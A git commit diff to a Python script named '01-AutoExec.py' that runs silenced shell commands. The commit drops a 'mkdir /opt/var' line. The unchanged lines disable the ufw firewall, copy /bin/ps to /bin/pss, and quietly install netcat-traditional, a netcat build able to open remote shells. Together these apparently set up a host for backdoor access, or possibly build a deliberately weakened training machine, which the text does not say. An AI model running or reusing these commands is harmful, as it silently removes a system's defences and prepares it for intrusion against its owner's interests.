8e0dd040d9cc0415c904d88006f192b49a3b1237
CyberCyber2 <56095531+CyberCyber2@users.noreply.github.com>
2021-03-17 08:55:04 -0400

    Update 01-AutoExec.py

--- BaseFiles/01-AutoExec.py
+++ BaseFiles/01-AutoExec.py
@@ -1,6 +1,5 @@
 #[enable]
 import os
-os.system("mkdir /opt/var &> /dev/null")
 os.system("ufw disable &> /dev/null")
 os.system("cp /bin/ps /bin/pss  &> /dev/null")
 os.system("apt-get install -y -vv netcat-traditional  &> /dev/null")
